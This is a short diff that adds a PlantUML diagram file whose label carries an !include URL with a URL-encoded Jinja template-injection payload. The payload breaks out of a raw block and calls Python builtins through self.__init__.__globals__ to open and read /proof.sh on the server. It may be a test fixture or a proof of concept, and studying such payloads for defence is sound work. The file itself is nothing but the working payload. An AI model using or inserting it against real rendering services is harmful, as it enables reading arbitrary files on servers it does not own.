@@ -1,0 +1,5 @@
+@startuml
+label z as "
+!include http://puml.local/?puml=flag%0A%7B%25%20endraw%20%25%7D%0A%7B%7B%20self.__init__.__globals__.__builtins__.open(%22%2Fproof.sh%22).read()%20%7D%7D%0A%7B%25%20raw%20%25%7D%0A
+"
+@enduml
